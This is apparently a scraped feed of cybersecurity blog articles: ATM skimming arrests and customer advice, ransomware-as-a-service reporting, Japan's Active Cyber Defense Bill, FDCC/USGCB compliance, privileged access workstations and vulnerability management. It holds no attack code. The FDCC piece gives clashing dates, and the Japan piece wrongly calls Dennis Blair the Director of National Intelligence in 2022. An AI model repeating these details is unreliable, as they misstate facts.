before any customers reached the actual ATMs.\nFurthermore, the crooks were able to use a hidden camera in the lobby, rather than glued onto any specific ATM, to watch out for users’ PINs.\nLike the abovementioned MOVEit attacks, where companies had their trophy data stolen without their own computers being accessed at all, these crooks recovered ATM card data and matching PINs for multiple different banks without physically touching a single ATM.\nIn another case we know of, the crooks secretly filmed PINs at an ATM on a bank’s own premises by placing their surveillance camera not on the ATM itself, which staff were trained to check regularly, but at the bottom of a corporate brochure holder on the wall alongside the cash machine.\nStaff, it seemed, inadvertently assisted the criminals by dutifully refilling the brochure holder every time it ran low on marketing material, providing literal cover for the hidden compartment at the bottom where the spy camera hardware was tucked away.\nSkimmers still in business\nWell, ATM skimming is still very much a cybercrime-in-progress, as\nreported over the weekend\nby the Brisbane police in Queensland, Australia, where three men were arrested recently for a range of skimming-related offences.\nThe bust seems to have gone down something like this:\n2023-07-31: Skimming devices found in an intercepted postal package.\nIt looks as though the package was addressed to a non-existent person, presumably giving the residents at the delivery address plausible deniability if they were raided when the parcel arrived.\n2023-08-02: Compromised ATM reported to police by a local bank.\nAs mentioned above, financial insitutions regularly sweep their cash machines for signs of tampering or stuck-on parts. Skimming devices are typically made to order, typically 3D-moulded out of plastic to fit closely over specific models of ATM, and adorned with any words, symbols or brand marks needed to match the ATM they’re going to be attached to.\n2023-08-03: Cybercrime detectives on watch noticed two men approaching the compromised ATM.\nWe’re assuming that the bank deliberately took the compromised ATM out of service, thus not only preventing customers from actively being skimmed, but also suggesting to the crooks that if they wanted to retrieve the skimmer, they should act quickly before the ATM was visited for “repair” and the device found and confiscated.\nAfter a short but swift foot-chase through Brisbane’s popular Queen Street Mall, the fleeing suspects were apprehended and arrested.\nWith a search warrant now in hand for the delivery address on the intercepted package, the cops paid a visit and allege that they found\n“two pin-hole cameras and several fraudulent identification items, including bank cards, and images of a licence and passport.”\nThe cameras, say the police, were hidden inside bank-branded ATM parts.\nAlso, according to the cops, one of the fake IDs recovered in the raid just happened to match the name on the intercepted package containing skimming devices.\nThat’s when the third suspect was arrested.\nWhat to do?\nTo get an idea of what to look out for on suspicious ATMs, why not watch selected video footage from the bust, as\nposted\nby the Queensland Police?\nThe skimming hardware components appear at the end, after some bodycam footage of the suspects getting overhauled and nabbed in the foot-chase, complete with the sound of handcuffs clicking shut:\nhttps://r2.mypolice.qld.gov.au/uploads/2023/08/10/002221_card-skimming-v4.mp4\nThe police didn’t put any known objects in with the skimming panels for a sense of scale, but we’re guessing that the blue plastic panels you will see, inside one of which is hidden what looks like an off-the-shelf embedded system-on-chip motherboard, are designed to sit alongside the slot into which you insert your ATM card.\nWe’re guessing that the two-tone blue matches the bank’s own colour scheme, with the yellow arrow pointing at the card slot.\nAs mentioned above, skimming devices are often made to order to match the current branding of the bank and the ATMs that the crooks are targeting, thus making them harder to spot than some of the the generic, beige-coloured panels that we’ve seen in the past, like this one from a\nQueensland Police bust\nback in 2012:\nRed arrow points at spy-hole in fake slot surround.\nOr advice is:\nDon’t be shy to inspect ATM hardware and your surroundings closely.\nPut your eyes right up to the surface if you’re not certain whether any particular part really belongs.\nAlways cover the keypad fully when entering your PIN.\nDo this even when you’re inside a bank and there’s apparently no one else around.\nGrab hold and give it a wiggle if you’re not sure.\nLook out for parts that don’t quite fit properly, that don’t match the original design, or that are apparently not part of the original ATM’s construction.\nIf you see something, say something.\nDon’t enter your PIN. Recover your card, walk away quietly, and contact your local police or call the bank concerned. Use a number from your card or a previous statement, or at worst a contact number shown on the ATM’s own screen. Don’t call any numbers attached to or displayed next to the ATM, because the crooks could have put them there themselves.\nAs always, look before you leap..\nShare this:\nMastodon\nBluesky\nReddit\nLinkedIn\nMore\nTumblr\nPocket\nPrint\nEmail",

Specifically, clients used the servers of LolekHosted as intermediaries when gaining unauthorized access to victim networks, and to store hacking tools and data stolen from victims.\nWhat next?\nIf caught and convicted, the DOJ says that it is seeking a to recover a whopping $21,500,000 in forfeited funds from Grabowski, a sum that the DOJ claims matches the proceeds of the criminal activities with which he has been charged.\nWe don’t know what happens if Grabowski gets caught and won’t or can’t come up with the money, but the DOJ also points out that the maximum jail-time penalty he faces if convicted on all charges (for all that maxiumum sentences are rarely imposed) comes to 45 years.\nShare this:\nMastodon\nBluesky\nReddit\nLinkedIn\nMore\nTumblr\nPocket\nPrint\nEmail",

        "published": "Tue, 01 Apr 2025 03:39:08 -0500",
        "content": "Image\nOver the past few years, many countries have made considerable efforts to bolster\ncybersecurity preparedness\n. These efforts are understandable when put into a geopolitical context: global relationships in the past five years have been among the most tumultuous in decades, cybersecurity threats are more sophisticated than ever, and the world is increasingly reliant on digital technologies.\nHowever, many of these cybersecurity preparedness efforts are remarkably alike, with most of them including risk management frameworks, incident response and recovery support, and legal guidelines. It’s exceedingly rare for these efforts to stray from the norm - that is, until recently.\nIn early 2025, Japan passed two articles of legislation that constitute the Active Cyber Defense Bill. Much of the Bill is pretty standard, but its introduction of active measures - which empower Japan’s military and law enforcement agencies to take preemptive action against cyber threats - is more interesting. Let’s look at why.\nWhat Prompted the Bill?\nBut first, let’s explore the context. Even the situation that prompted Japan’s Active Cyber Defense Bill is somewhat unique. It comes in two parts.\nBlair Shock\nIn April 2022, the then-US Director of National Intelligence, Dennis C. Blair, publicly criticized Japan’s digital defenses. His remarks deeply impacted Japanese lawmakers and sparked what has come to be known as “Blair Shock,”\nAs such, unlike other countries, Japan’s\ncybersecurity\nlegislation is about more than just remedying a technological shortfall; it is about restoring national confidence and asserting Japan’s commitment to protecting its critical infrastructure and industrial base. The Active Defense Bill is a direct outcome of this wake-up call and, consequently, takes an innovative, proactive, and, some may argue, extreme approach to improving cybersecurity preparedness.\nGeopolitical Challenges\nGeopolitical pressures also significantly influenced the development of Japan’s Active Cyber\nDefense Bill\n. China - one of the world’s most prolific conductors of\ncyber espionage\n-is right on Japan’s doorstep, and the two countries have long had a difficult relationship.\nThroughout the past decade or so, cyber-espionage activities attributed to China have escalated significantly. For example, Japan has consistently accused MirrorFace, a suspected Chinese-backed espionage group, of siphoning off national security secrets and intellectual property.\nThese threats, combined with other cybercriminal activities, such as ransomware and supply chain attacks, have put Japan’s critical infrastructure and defense sectors at risk. The Active Cyber Defense Bill is fundamentally an offensive measure; by taking a more aggressive stance, Japan aims to deter potential adversaries and reduce the window of opportunity for attackers.\nThe Active Cyber Defense Bill: A Two-Pronged Approach\nNow that we understand what prompted the Bill, we can examine its makeup in more detail. We’ll start with the more boring bit. The first prong of the Bill involves bolstering passive defense mechanisms. It establishes a cybersecurity council and oversight committee to enhance information gathering and threat analysis and requires\ncritical infrastructure\nproviders to promptly report cybersecurity incidents – all pretty standard stuff.\nWhat’s more, the prime minister has been granted new powers to collect information from\ntelecommunications\nproviders, albeit with strict safeguards to ensure that sensitive data is filtered appropriately. Again, this is not unprecedented – the US, UK, and Australia all have similar measures.\nHowever, the second prong - the “active” part of the bill - is where things get interesting. As noted, it empowers Japan’s military and law enforcement agencies to take pre-emptive action against cyber threats. This means that law enforcement will employ “cyber harm prevention officers” whose responsibilities include proactively disrupting enemy servers during an ongoing cyberattack. Most notably of all, in critical incidents necessitating rapid response, these officers may act without explicit oversight. These measures are unique to Japan and somewhat controversial; one might even describe them as “vigilante hacking.”\nPotential Concerns\nWhile the Active Cyber Defense Bill will undoubtedly improve Japan’s cyber preparedness, we can’t ignore the potential for government overreach. Empowering military and law enforcement agencies with pre-emptive cyber capabilities inevitably raises concerns about privacy and civil liberties. Moreover, if not properly checked, these powers could be misused or lead to unintended consequences for international diplomacy.\nIn a world where “cyber war” is a near-constant threat, granting law enforcement the power to launch offensive cybersecurity actions – potentially without explicit permission – is a concerning prospect. Japan will need to implement strict oversight to prevent disaster.\nLooking Ahead\nWhatever your opinion of the Bill, this is undeniably a massive moment for nation-state cybersecurity. Proactive approaches to cybersecurity have long been a big part of the private sector, so it’s interesting to see this concept translate into the public sphere. As cyber threats grow ever more sophisticated, offensive security is going to become more important. But is Japan’s Active Defense Bill going about it the wrong way? Could it result in disaster? We’ll just have to wait and see.\nEditor’s Note:\nThe opinions expressed in this guest author article are solely those of the contributor and do not necessarily reflect those of Tripwire.\nMeet the Expert\nJosh Breaker-Rolfe\nGuest Writer\nView Profile\nRelated Solutions\nCybersecurity\nCompliance\nRelated Content\nBlog\nThe Intersection of Public Policy and Cybersecurity: Building a Framework for 2025 and Beyond\nBlog\nNew Law Could Mean Prison for Reporting Data Leaks",

        "content": "Image\nWhen relocating office locations domestically or internationally, organizations must ensure the safe passage and management of more than just their physical assets and hardware.\nThe complex cybersecurity obstacles before, during, and after an operational overhaul can outnumber the physical difficulties of getting operations moving. On the digital side, failing to maintain proper cyber hygiene can disrupt operational consistency and pose several\nregulatory compliance\nconcerns, which no organization wants to endure.\nA lack of cybersecurity awareness and training has often been attributed to ‌\nsmall businesses\nbeing overly exposed to malicious actors and threats. To prevent an attack from escalating into an operational hazard, it’s prudent to exercise proper cyber hygiene before a move has even been agreed‌ upon.\nWith that in mind, whether migrating locations domestically or establishing new facilities overseas, it’s important to recognize the security considerations they could face on the digital side. Consider these incumbent or future concerns and the proactive steps you can take to safeguard your assets, data, intellectual property, brand integrity, and consumer trust.\nAsset Discovery and Risk Assessment\nBefore any physical movement begins, organizations need a comprehensive understanding of their digital footprint. This includes comprehensive documentation of all network components and integrations, from switches to personal IoT (Internet of Things) devices. Most corporate premises will have smart building monitoring systems and asset management solutions that work with any incumbent hardware.\nHowever, to\nenhance security in an office building\n, surveillance systems, the presence of on-site guards, and a comprehensive assessment will be necessary to prevent unauthorised access and security breaches. Security should also incorporate cataloging digital assets, cloud-based data storage locations, servers, and backup systems and processes.\nOrganizations with sensitive and high-profile intellectual property (IP), assets, product prototypes, supporting information, research, and tests must be mindful of document security at rest and in transit. If such information were unveiled without proper protocols, it could breach product embargoes, invalidate non-disclosure agreements (NDAs), and disrupt research and development (R&D)\ntax credit claims\n, potentially opening organizations up to litigation.\nAssess each critical system and device thoroughly, especially if they require minimal downtime. Devices and software that are expected to be running constantly will need to be regularly validated, patched, and managed, the processes of which can be entrusted to automation. However, human oversight and supervision are vital, particularly during a corporate relocation. Therefore, whether you’re overseeing an on-site\nhotel project management system\noverhaul or an entire infrastructure upgrade from a team of 30 employees merging into a larger office with a headcount twice as big, every component must be thoroughly tested, updated, and integrated. Any vulnerabilities must be identified, fixed, and monitored to ensure compatibility and security.\nNetwork Security and Infrastructure Planning\nSecuring network infrastructure during transition requires careful consideration of temporary and permanent security measures. Implementing strict segmentation policies to isolate systems during the move is recommended to prevent unauthorized access when systems are most vulnerable.\nSeamless and compliant data migration to new on-premise servers is vital for organizations leveraging public, private, or hybrid cloud infrastructure. The same can be said if moving from an on-premise environment to one in the cloud. The important pre-migration checks involve reviewing provider agreements, validating security controls, and updating access control policies to reflect the new network while upholding the same hygiene as the incumbent.\nData Protection and Privacy Compliance\nMaintaining compliance with various regulatory frameworks during relocation is essential.\nWhile some are transient across industries and geographical borders, such as GDPR (General Data Protection Regulations),\nPCI DSS\n(Payment Card Industry Data Security Standard), and SOX (the Sarbanes-Oxley Act), others are more sector-specific, such as HIPAA (the Health Insurance Portability and Accountability Act) and\nTISAX\n(the Trusted Information Security Assessment Exchange).\nCompliance becomes a highly intricate and complex procedure for whatever standards and regulations apply to your industry when moving data between different jurisdictions or when dealing with data that moves between different security systems.\nAccess Control and Identity Management\nReviewing and securing access to critical data becomes more vital when it is in transit from one location to another. Restricting access to only the relevant personnel ensures the safe journey of critical data, allowing informed decisions to be made without excessive interference.\nIn a relocation context, implementing strict segmentation policies and controls to isolate systems during the move and ensuring that any temporary contractors working on migrations, for example, cannot reach a certain level or uncover intricate metadata will be vital. Updating access credentials, certificates, and security keys or tokens to reflect new network configurations and locations will also prove incredibly important.\nThe salient point is to maintain\nzero-trust\nprinciples during any transition, whatever its complexity or scale.\nBusiness Continuity and Disaster Recovery\nOrganizations will always want to preserve their long-term resilience throughout any relocation period. While careful decisions will have been made well before any move, for example, to confirm the suitability of a new architecture, network bandwidth, server space, and so on, sometimes results can vary. Organizations will want confirmation and validation that they\nTesting and validating backup systems (system configuration and data backups) before, during, and after relocation will provide peace of mind. In case of any failures during the transition, establishing clear system recovery procedures will be made easier with the help of defined recovery time objectives (RTOs) and recovery point objectives (RPOs). Business continuity and disaster recovery plans must be kept safe, as will compliance certificates, cybersecurity policies, and important technical documentation, which must be safeguarded at every touchpoint. However, they must be updated to reflect new network configurations, security controls, and any location-specific restrictions.\nKey Takeaways for Corporate Relocations\nExecuting a successful commercial relocation is far from easy. It involves a series of comprehensive technical investigations and measures to validate the stability and suitability of your new environment. Organizations have many assets and systems to maintain while ensuring continuity and compliance, and it may seem like a tall order. Still, with the right partnerships, it can be made infinitely easier.\nOne key ingredient to successfully navigating a premises move is to treat it as an opportunity to enhance your security posture and firm up your controls rather than view it exclusively as a risk management exercise. This allows organizations to emerge from a transition in a better place, with reinforced infrastructure and policies that meet their current needs and future challenges.\nEditor’s Note:\nThe opinions expressed in this and other guest author articles are solely those of the contributor and do not necessarily reflect those of Tripwire.\nMeet the Expert\nChester Avey\nGuest Writer\nView Profile\nRelated Solutions\nCybersecurity",

        "content": "Image\nFederal Desktop Core Configuration (FDCC) was mandated by the US Office of Management and Budget (OMB) in 2007 and provides a set of security standards that must be adhered to by all federal workstations and laptops running Windows XP or Vista.\nFDCC evolved into the\nUnited States Government Configuration Baseline (USGCB)\nstarting in 2010, although some agencies and contracts may still be under lingering FDCC compliance obligations. Consequently, the updated standard is now often referred to as \"FDCC/USGCB\" or \"USGCB (FDCC)\" for reference. FDCC/USGCB is not its own law; rather, it is a central requirement under\nFISMA (Federal Information Security Modernization Act)\n.\nHere's what you need to know about FDCC/USGCB compliance today and how Fortra can help you meet its requirements.\nWhat is FDCC/USGCB?\nFDCC, or Federal Desktop Core Configuration, was designed to improve the security of Windows desktop and laptop operating systems for every US federal government computer and any machine that wanted to connect to a federal office computer network. It includes security standards pertaining to a list of agreed-upon files, applications, services, and system functions common to Windows OS and central to core operations.\nIn 2007, NIST evolved the FDCC into the\nUnited States Government Configuration Baseline (USGCB)\n, largely to accommodate Windows 7. As noted by\nNIST\n, \"To better support configuration setting baseline guidance under the FDCC mandate, USGCB was created, and USGCB configuration settings replaced the original FDCC configuration settings for the existing supported platform baselines.\" For recognition, many still refer to the updated USGCB requirements as FDCC/USGCB, as mentioned above.\nBecause the Windows platform was purposely built to facilitate easy and even automatic or semi-automatic connections to other computers, the FDCC/USGCB configuration requirements seek to reverse those default connection capabilities and replace them with manual (or intentional) ones for added security. The Federal Desktop Core Configuration standards were created by NIST in collaboration with OMB, DHS, DOI, DISA, NSA, USAF, and Microsoft and are still maintained by NIST today (as the updated United States Government Configuration Baseline, or \"FDCC/USGCB\" as referred to in this blog).\nWho – And What Systems - Must Comply with FDCC/USGCB?\nAll federal government agencies and contractors that access government networks are required to comply with FDCC/USGCB regulations. While compliance only applies to general-purpose systems like managed desktops and laptops (\"workstations\"), other specialized systems like embedded computers, specialized experimental systems, and process control systems\nmay\nadhere to FDCC/USGCB standards for additional security.\nAdditionally, FDCC/USGCB compliance extends to contractor computers that run Windows 7, Windows XP, and Vista. These must be owned and operated by a US government contractor or in some way integrated into a federal system.\nWhat Are the FDCC (USGCB) Requirements?\n. Generally, FDCC/USGCB configurations:\nBlock open connections in operating systems\nDisable unnecessary services\nAlter permissions on items\nAffect Group Policy Object (GPO) settings\nChange how log files are collected and recorded\nThere are over 450 Windows and 117 Internet Explorer FDCC/USGCB configuration settings in effect (see \"USGCB Windows Settings\" under \"Documentation\" on the\nNIST USGCB page\n). While a comprehensive list here is not possible, here are a few Windows requirements for context:\n5. Turn off downloading of print drivers over HTTP |\n\"To minimize the risk of users downloading drivers that include malicious code.\"\n57. Turn off Windows Error Reporting |\n\"To lower the risk of a user unknowingly exposing sensitive data.\"\n101. Do not allow passwords to be saved |\n\"To prevent the caching of user credentials.\"\n102. Turn off downloading of enclosures |\n\"To reduce the risk of a user unknowingly downloading malicious content.\"\n124. Do Not Show First Use Dialogue Boxes |\n\"To prevent the user from changing configuration settings.\"\nWhile many FDCC/USGCB settings are widely applicable, not\nall\nare practical for small or home office (SOHO) computers (a significant number of the federal general-purpose workstations to which the requirements apply). For these cases, an\nFDCC deviation report\ncan be submitted.\nTripwire Supports FDCC/USGCB Compliance\nEnsuring Windows configuration settings remain secure, compliant, and consistent is the name of the game for meeting FDCC/USGCB requirements. An organization can apply the correct settings once, overhauling its entire configuration setup, only to experience configuration drift and have to do the whole process over again or at least redo a number of needle-in-a-haystack parts. Discovering which among the many settings are outdated or on which workstations they reside can be a monumental task.\nFortra's Tripwire\nintegrity management solutions\nprevent configuration drift.\nA security configuration management (SCM) platform\ncan offer continuous, centralized system hardening.\nChange monitoring tools\ncan detect unauthorized changes to configuration settings in real-time,\naddressing vulnerabilities\nand even re-applying the correct configuration automatically.\nAnd Tripwire's managed cybersecurity services (\nTripwire ExpertOps\n) can make the implementation of those 450-plus Windows settings that much easier, outsourcing operational tasks to experienced professionals.\nWith Tripwire integrity management and cybersecurity solutions, federal agencies that\nachieve\nFDCC/USGCB compliance can\nmaintain\nFDCC/USGCB compliance as they move forward.\nMeet the Expert\nKatrina Thompson\nGuest Writer\nView Profile\nRelated Solutions\nCompliance\nSecurity Configuration Management\nRelated Content\nBlog\nGAO Urges Stronger Federal Cybersecurity Measures Amid Rising Threats",

        "content": "Image\nWhat is the VanHelsing ransomware?\nFirst reported earlier in March 2025,\nVanHelsing\nis a new ransomware-as-a-service operation.\nOh, so it's a relatively new player on the malware scene, then. Why the concern?\nAt least three victims of VanHelsing have already been identitified, and a number of variants of the malware have been analysed by security researchers. The fact that VanHelsing runs as a RaaS operation means that the problem could become significantly worse.\nRemind me again, what is RaaS?\nRaaS stands for ransomware-as-a-service. The criminals behind VanHelsing lease out their tools and infrastructure to \"affiliates\" who will launch the attacks, and then share a slice of the money they extort with the VanHelsing operators.\nCan anyone become a VanHelsing affiliate?\nNewcomers to the ransomware scene will need to pay a US $5,000 deposit, but if you are an established cybercriminal you may be allowed to skip payment. VanHelsing affiliates can keep 80% of the ransom payments they extort from their victims - leaving 20% to VanHelsing's operators.\n80% sounds like a good deal...\nYes, and this is one of the reasons why the VanHelsing ransomware is a concern. The rich rewards may encourage many more attacks by affiliates against unprepared organisations. I hope you're not tempted!\nNo, of course not. But are there any rules about being an affiliate?\nThe one main rule is that VanHelsing affiliates are strictly banned from targeting computer systems in the Commonwealth of Independent States (CIS).\nSo attacking CIS countries with VanHelsing is forbidden?\nCorrect. CIS member countries are all allied with Russia, and include a number of former Soviet republics:\nArmenia\nAzerbaijan\nBelarus\nKazakhstan\nKyrgyzstan\nMoldova\nRussia\nTajikistan\nUzbekistan\nWhy would the VanHelsing affiliates banned from attacking these countries?\nWhy do you think?\nOh! Because VanHelsing doesn't want to poke the bear...\nBingo! Many ransomware gangs have a policy of not attacking organisations in their home countries (or allies) for fear that law enforcement will take a more active interest in putting an end to their activities.\nSo does VanHelsing do the normal things expected of ransomware?\nYes, it will encrypt files on victims' computers, and demand that a ransom is paid for the decryption key. Encrypted files can easily be identified because they have the extension .vanhelsing added to their filenames. As an extra incentive for victims to pay the ransom, data is exfiltrated during the attack and organisations are told that it will be published on a leak site if no payment is made.\nImage\nSo, how much do the attackers demand from their victims?\nSecurity reearchers say that they have seen attackers request a ransom of US $500,000 be sent to a Bitcoin wallet.\nAre there any other reasons why the cybersecurity community is concerned about VanHelsing?\nWell, despite VanHelsing being a relative new entrant on the digital battlefield, a more sophisticated version of the ransomware has already emerged - increasing worry that resources are actively being put into its development.\nWhich platforms does it target?\nVanHelsing is unusual in targeting a variety of platforms - including Windows, Linux BSD, ARM, and VMWare ESXi - seemingly in an attempt to broaden its capacity to extort a ransom from impacted organisations. So far only Windows-baed victims have been reported, however.\nSo how can my company protect itself from VanHelsing?\nThe best advice is to follow the recommendations on\nhow to protect your organisation\nfrom other ransomware. Those include:\nmaking secure offsite backups.\nrunning up-to-date security solutions and ensuring that your computers and network devices are properly configured and protected with the latest security patches against vulnerabilities.\nusing hard-to-crack unique passwords to protect sensitive data and accounts, as well as enabling multi-factor authentication.\nencrypting sensitive data wherever possible.\nreducing the attack surface by disabling functionality that your company does not need.\neducating and informing staff about the risks and methods used by cybercriminals to launch attacks and steal data.\nEditor’s Note: The opinions expressed in this and other guest author articles are solely those of the contributor and do not necessarily reflect those of Tripwire.\nBeating the Business of Ransomware\nLearn how to beat cybercriminal’s ransomware business.\nLearn More\nMeet the Expert\nGraham Cluley\nCybercrime Researcher and Blogger\nView Profile\nRelated Solutions\nVulnerability & Risk Management\nCybersecurity\nRelated Content\nBlog\n30 Ransomware Prevention Tips\nBlog\nAdvanced Ransomware Evasion Techniques in 2025",

        "content": "Image\nAt a time when cyber threats seem to escalate daily, security teams are always on the lookout for new ways to protect their sensitive data and systems. For some,\nPrivileged Access Workstations\n(PAWs) are being viewed as one solution to keep privileged accounts and critical systems safe from compromise. These are specialized workstations built for administrators and users who manage highly sensitive environments.\nPAWs\nare dedicated, hardened workstations that\nprovide a secure environment\nwhen performing administrative or privileged tasks. Unlike everyday endpoints, these machines are isolated from corporate networks and fitted with advanced security measures to limit risks like credential theft, phishing, and malware. With PAWs, privileged actions, such as configuring critical infrastructure or accessing the company’s most confidential data, happen in a highly controlled, secure setting.\nWhy PAWs Matter\nThe need for PAWs has grown as malefactors increasingly target privileged accounts. According to reports, attackers often exploit compromised credentials to move laterally within an organization, escalating their privileges to access critical systems.\nThere are several reasons why PAWs are critical:\nProtection Against Credential Theft: PAWs cut the risk of malicious actors harvesting credentials through phishing or keylogging on compromised machines by isolating privileged tasks.\nCompliance with Regulations: Many regulations mandate stringent controls for privileged access, particularly for entities that handle sensitive data, such as financial services and healthcare. These computers help firms remain compliant and demonstrate due diligence.\nInsider Threats Mitigation\n: Privileged Access Workstations limit administrative actions to a secure workstation, minimizing the chance of abuse by insiders.\nOperational Resilience: Securely managing critical systems helps maintain business continuity when faced with cyber threats.\nThe Key Benefits of Privileged Access Workstations\nCompanies that invest in PAWs can reap several compelling benefits. For one, these workstations are hardened against threats because they are designed with robust security features like multifactor authentication (MFA), application whitelisting, and advanced monitoring—all of which shrink the attack surface.\nIn addition, PAWs control administrative access and are dedicated to privileged activities, eliminating the risks associated with conducting sensitive tasks on unsecured endpoints. These machines also align with frameworks like NIS2, ISO 27001, and GDPR by enforcing access controls and protecting sensitive operations.\nSince Privileged Access Workstations are isolated from internet and email access, they are also less likely to become infected by malware or ransomware, and centralized logging and monitoring help entities track all administrative activities for better transparency.\nThe Challenges When Implementing PAWs\nDespite their clear advantages, implementing Privileged Access Workstations comes with its own set of challenges. Understanding these is key to maximizing their effectiveness:\nThe Cost of Deployment: Setting up and maintaining PAWs requires an upfront investment in hardware, software, and support, which can strain the budget, particularly for smaller entities.\nUser Adoption: Administrators who are used to performing tasks on general-purpose machines may resist the shift to dedicated workstations, so adequate training is needed to address their concerns.\nThe Complexity of Management: Many security teams are already overburdened, and managing PAWs as well as existing IT infrastructure can be complex, especially in large enterprises that have diverse systems and networks.\nBalancing Security and Usability: There’s always a balance between security and the user experience, and although PAWs are secure, they may hamper user productivity because of their inherent restrictions, such as limited access to non-administrative applications.\nScalability Issues: Scaling Privileged Access Workstations across a global workforce comes with its own logistical and operational challenges, most notably in enterprises with remote or hybrid setups.\nThe Future of Privileged Access Workstations\nAs the cybersecurity landscape evolves, Privileged Access Workstations will play an increasingly pivotal role in protecting companies against advanced threats. There are several ways the industry can expect these workstations to evolve in the future:\nIntegration with Zero Trust Architectures: PAWs will start to be integrated into Zero Trust Security frameworks so that no user or device is trusted by default.\nAI-Powered Monitoring: Advanced analytics and artificial intelligence (AI) will enhance PAW monitoring, facilitating the real-time detection of anomalies and potential threats.\nCloud-Based PAWs: As entities migrate more of their workloads to the cloud, virtual PAWs may emerge, offering the same degree of security while minimizing physical hardware investments.\nAutomation for Scalability: Automated deployment and management tools will make PAWs more scalable, enabling seamless integration into hybrid and\nremote work environments.\nImproved Usability: Future iterations of PAWs will focus more on balancing security with the user experience to help administrators work efficiently without compromising safety.\nA Promising Future\nThe future of PAWS looks promising. By providing a secure, controlled environment for privileged tasks, these machines mitigate risks, enhance compliance, and boost operational resilience.\nHowever, successful implementation takes careful planning to address the challenges of cost, usability, and scalability. As technology advances, the role of PAWs will evolve, too, with features like cloud integration, AI-driven monitoring, and enhanced usability becoming standard.\nFirms that invest in PAWs today will be better prepared to face tomorrow’s cybersecurity challenges.\nEditor's Note:\nThe opinions expressed in this and other guest author articles are solely those of the contributor and do not necessarily reflect those of Tripwire.\nMeet the Expert\nKirsten Doyle\nGuest Writer\nView Profile\nRelated Solutions\nSecurity Configuration Management\nRelated Content\nBlog\nMonitoring Applications vs. Operating Systems: Why It Matters\nBlog\nZero Trust Principles for Critical Infrastructure Security\nBlog\nWhy Configurations Are the Wrong Thing to Get Wrong",

        "content": "Image\nThe terms “patch management” and “\nvulnerability management\n“ are\nnot the same\n. And that difference is a\nbig\ndifference.\nThey may be confused because applying patches is\none\nof the many ways to mitigate cyber risks. However, it is one piece of the entire vulnerability management puzzle and organizations that do not realize this are burdened with a false sense of security. A patch management program is a wonderful start, but it does not have the reach or resources of a fully mature vulnerability management program.\nAn effective vulnerability management program does more than update outdated programs. It gives you the intelligence to know which out-of-date programs are most important to patch and which will just needlessly expend energy. It lets you see which vulnerabilities are most attractive to attackers and make wise decisions with your resources instead of blindly fixing anything amiss without the bigger picture. It lets you preserve business operations while strategizing the most important remediations.\nFurthermore, it continues this virtuous cycle until your posture is far more advanced, intelligent, and autonomous than one using patch management alone.\nWhat Vulnerability Management Is – And Isn’t\nVulnerability management is more than just getting alerts whenever your infrastructure needs a patch applied. Vulnerability management is about making informed decisions and properly prioritizing what vulnerabilities to mitigate and how. This is achieved by embedding internal hooks for telemetry into all systems of interest as well as external hooks for threat intelligence from all sources.\nTo be effective, a vulnerability management program has to be backed up by good threat intelligence that provides a deeper understanding of how and why threat actors are targeting certain vulnerabilities and ignoring others. Intelligence on vulnerability exploitability prepares your organization to strike the correct balance between patching vulnerable systems and interrupting business operations.\nA\nrisk-based approach\nto vulnerability management makes it much easier to communicate the danger of a vulnerability to your security and operations teams, senior managers, and even the board. This level of visibility into the rationale behind decisions made around vulnerabilities will increase confidence in the security team across your entire organization and will help prevent data breaches, such as the one\nEquifax\nsuffered, from happening to you.\nStages of a Mature Vulnerability Management Program\nThere are four main stages of any effective vulnerability management program:\n1. Scanning\n| The process that determines the criticality of the asset, the owners of the assets, and the frequency of scanning, as well as establish the timelines for remediation.\n2. Discovery\n| The discovery and inventory of assets on the network.\n3. Vulnerabilities Detection\n| The discovery of vulnerabilities on the discovered assets.\n4. Reporting and Remediation\n| The reporting and remediation of discovered vulnerabilities.\nThe first stage focuses on building a process that is measurable and repeatable. Stages two through four focus on executing the process with an emphasis on continuous improvement. Let us examine briefly each stage and see how solution can help you.\nStage 1: Scanning\nThe first stage can be divided into four steps.\n1. Identify the criticality of the assets in the organization.\nAssets should be classified and ranked based on their true and inherent risk to the organization. Many aspects need to be considered in developing an asset’s inherent risk, such as physical or logical connection to higher classified assets, user access, and system availability. Assets with higher criticality will be prioritized higher than assets with lower criticality.\n2. Identify the owners for each system.\nSystem owners are responsible for the asset, its associated risk, and the liability if that asset becomes compromised. Accountability is a driving factor for the ultimate success of the vulnerability management program. Orphaned assets and vulnerabilities will be left forgotten and will become an unidentified risk to the organization.\n3. Establish the frequency of scanning.\nThe Center for Internet Security in their\nCIS Control 3 “Continuous Vulnerability Management”\nrecommends that an organization should scan once per week (or more). As an outer limit, vulnerability scanning should occur at least monthly. Frequent scanning allows the owners of the assets to track the progress of remediation, identify new risks, and re-prioritize the remediation of vulnerabilities based on updated intelligence.\n4. Create timelines for remediation.\nRemediation timelines should take into account the severity of the vulnerability, remediating high-impact flaws first. The program should also leave room for flexibility in case a vulnerability cannot be remediated within the approved time frame. Remediation exception processes will document the accepted risk together with an action plan to remediate the vulnerability by a certain date.\nStage 2: Discovery\nAsset discovery and inventory are the foundations for any security program and incidentally makeup CIS Controls One and Two.\nYou can’t protect what you don’t know about.\n1. Track hardware\n| The purpose of\nCIS Control 1\nis to “Actively manage (inventory, track, and correct) all hardware devices on the network so that only authorized devices are given access, and unauthorized and unmanaged devices are found and prevented from gaining access.”\n2. Track software\n| Furthermore,\nCIS Control 2\nhighlights the need to “Actively manage (inventory, track, and correct) all software on the network so that only authorized software is installed and can execute, and that unauthorized and unmanaged software is found and prevented from installation or execution.”\nThese two controls go hand in hand, as attackers are always trying to identify systems that are easily exploitable so they can get into an organization’s network using such things as\nshadow IT\n.\nWithout the appropriate asset discovery and network access control, these types of devices can provide an easy gateway for an attacker into the corporate network. Once they’re in, they can leverage the control they’ve gained to attack other systems and further infiltrate the network. Ensuring that the information security team is aware of what’s on the network allows them to better protect those systems and provide guidance to the system owners to reduce the risk those assets pose.\nStage 3: Detection\nOnce all the assets on the network are identified, the next step is to identify the vulnerability risk posture of each asset. The recommended method for vulnerability scanning is to scan with credentials, just like a real-world attacker would.\nThis allows for increased accuracy in determining the organization’s vulnerability risk. You can then run vulnerability signatures specific to the operating system and installed applications that were detected in the discovery and inventory stage to identify which vulnerabilities are present.\nStage 4: Remediation\nThe remediation stage contains three primary phases:\n1. Scoring vulnerabilities\n| Once the vulnerability scan is complete, a score is attached based on the following:\nThe skills required to exploit the vulnerability.\nThe privileges gained upon successful exploitation.\nThe age of the vulnerability.\nThe first metric that should be taken is an overall baseline average risk score for the organization. Based on this metric, organizations should aim for a risk reduction rate of 20-25% on a yearly basis.\nThen, the owner's average risk score is calculated. Like the target for the overall organization, each owner should target reducing their average risk score by 10% to 25% year over year until they’re below the accepted threshold. To 